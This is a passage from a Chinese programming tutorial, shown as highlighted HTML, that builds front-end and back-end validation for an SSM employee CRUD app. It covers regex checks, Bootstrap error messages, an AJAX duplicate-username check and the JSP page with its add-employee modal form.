class="string">"#email_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        alert(<span class="string">"邮箱格式不正确"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击保存，保存员工</span></span><br><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line">    <span class="comment">//2.先对要提交给服务器的数据进行校验</span></span><br><span class="line">    <span class="keyword">if</span>(!validata_add_form())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>这样我们的逻辑就完成了，用户名和邮箱都需要正确才允许提交ajax请求</p>
<p>但是alert太难看了，可以在<a href="https://v3.bootcss.com/css/#forms-control-validation" target="_blank" rel="noopener">bootstrap表单</a>校验状态找到相应的操作</p>
<p>我们抽取一个方法show_validate_msg</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> show<span class="constructor">_validate_msg(<span class="params">ele</span>,<span class="params">status</span>,<span class="params">msg</span>)</span>&#123;</span><br><span class="line">       <span class="comment">//清空这个元素之前的样式</span></span><br><span class="line">       <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.remove<span class="constructor">Class(<span class="string">"has-success has-error"</span>)</span>;</span><br><span class="line">       <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(<span class="string">""</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(status<span class="operator"> == </span><span class="string">"success"</span>)&#123;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.add<span class="constructor">Class(<span class="string">"has-success"</span>)</span>;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(msg);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(status<span class="operator"> == </span><span class="string">"error"</span>)&#123;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.add<span class="constructor">Class(<span class="string">"has-error"</span>)</span>;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(msg);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>validata_add_form也要修改</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">//校验表单数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validata_add_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//1. 拿到要检验的数据，使用正则表达式</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="string">"#empName_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regName = <span class="regexp">/(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/</span>;</span><br><span class="line">    <span class="keyword">if</span>(!regName.test(empName))&#123;</span><br><span class="line">        <span class="comment">// alert("用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line">        <span class="comment">//清空这个元素之前的样式</span></span><br><span class="line">        show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="string">"用户名可以是2-5位中文或6-16位英文和数字的组合"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 校验邮箱信息</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("邮箱格式不正确");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"error"</span>,<span class="string">"邮箱格式不正确"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就完成了一个好看的检验信息，但是现在只是校验了合法性，但是并没有查重，所以接下来就需要进行一个查重的校验</p>
<h3 id="重复校验"><a href="#重复校验" class="headerlink" title="重复校验"></a>重复校验</h3><p>基本逻辑就是当查到重复的时候要提示出错误信息，并且不能保存，利用change事件来编写</p>
<p>首先需要编写一个checkUser方法</p>
<p>在EmployeeController中添加<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查用户名是否可用</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"/checkUser"</span>)</span></span><br><span class="line"><span class="keyword">public</span> Msg checkUser(<span class="meta">@RequestParam(<span class="meta-string">"empName"</span>)</span> String empName)&#123;</span><br><span class="line">    boolean b = employeeService.checkUser(empName);</span><br><span class="line">    <span class="keyword">if</span>(b)&#123;</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Msg.fail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>对应的Service中添加<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">public boolean check<span class="constructor">User(String <span class="params">empName</span>)</span> &#123;</span><br><span class="line">    EmployeeExample example = <span class="keyword">new</span> <span class="constructor">EmployeeExample()</span>;</span><br><span class="line">    EmployeeExample.Criteria criteria = example.create<span class="constructor">Criteria()</span>;</span><br><span class="line">    criteria.<span class="keyword">and</span><span class="constructor">EmpNameEqualTo(<span class="params">empName</span>)</span>;</span><br><span class="line">    long count = employeeMapper.count<span class="constructor">ByExample(<span class="params">example</span>)</span>;</span><br><span class="line">    return count==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着在index.jsp中添加上<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//校验用户名是否可用</span></span><br><span class="line">$(<span class="string">"#empName_add_input"</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//发送ajax请求校验用户名是否可用</span></span><br><span class="line">    <span class="keyword">var</span> empName = <span class="keyword">this</span>.value;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/checkUser"</span>,</span><br><span class="line">        data:<span class="string">"empName="</span>+empName,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result.code == <span class="number">200</span>)&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">"用户名可用"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"success"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="string">"用户名不可用"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>这里利用一个自定义的属性ajax-va来判断是否可用<br>保存事件也要添加上<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line">    <span class="comment">//2.先对要提交给服务器的数据进行校验</span></span><br><span class="line">    <span class="keyword">if</span>(!validata_add_form())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//3.判断之前的ajax用户名校验是否成功</span></span><br><span class="line">    <span class="keyword">if</span>($(<span class="keyword">this</span>).attr(<span class="string">"ajax-va"</span>)==<span class="string">"error"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p>
<p>因为使用的是change事件，只有内容发生改变的时候，才会执行此校验，所以为了防止绕过该校验信息，就需要每次提交后都重置表单<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#emp_add_modal_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//清除数据，表单重置</span></span><br><span class="line">    $(<span class="string">"#empAddModal form"</span>)[<span class="number">0</span>].reset();</span><br></pre></td></tr></table></figure></p>
<p>这样一来，一个完整的前端校验就完成了</p>
<h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>依旧是用正则表达式<br>在EmployeeController中修改checkUser<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查用户名是否可用</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="meta">@RequestMapping(<span class="meta-string">"/checkUser"</span>)</span></span><br><span class="line">   <span class="keyword">public</span> Msg checkUser(<span class="meta">@RequestParam(<span class="meta-string">"empName"</span>)</span> String empName)&#123;</span><br><span class="line">       <span class="comment">//先判断用户名是否是合法的表达式;</span></span><br><span class="line">       String regx = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span>;</span><br><span class="line">       <span class="keyword">if</span>(!empName.matches(regx))&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"用户名必须是6到16位数字和字母的组合或2-5位中文"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//数据库用户名重复校验</span></span><br><span class="line">       boolean b = employeeService.checkUser(empName);</span><br><span class="line">       <span class="keyword">if</span>(b)&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.success();</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"用户名不可用"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>同时修改index.jsp<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//校验用户名是否可用</span></span><br><span class="line">$(<span class="string">"#empName_add_input"</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//发送ajax请求校验用户名是否可用</span></span><br><span class="line">    <span class="keyword">var</span> empName = <span class="keyword">this</span>.value;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/checkUser"</span>,</span><br><span class="line">        data:<span class="string">"empName="</span>+empName,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result.code == <span class="number">200</span>)&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">"用户名可用"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"success"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,result.extend.va_msg);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>同时还有一个问题，就是清楚掉表单的样式</p>
<p>抽取一个方法reset_form<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//清空表单样式及内容</span></span><br><span class="line"><span class="keyword">function</span> reset<span class="constructor">_form(<span class="params">ele</span>)</span>&#123;</span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span><span class="literal">[<span class="number">0</span>]</span>.reset<span class="literal">()</span>;</span><br><span class="line">    <span class="comment">//清空样式</span></span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span>.find(<span class="string">"*"</span>).remove<span class="constructor">Class(<span class="string">"has-success has-error"</span>)</span>;</span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span>.find(<span class="string">".help-block"</span>).text(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>弹出模态框的事件也要修改<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#emp_add_modal_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//清除数据，表单重置</span></span><br><span class="line">    reset_form($(<span class="string">"#empAddModal form"</span>));</span><br></pre></td></tr></table></figure></p>
<p>当前的index.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 员工添加的模态框 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>员工添加<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                部门名称-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span 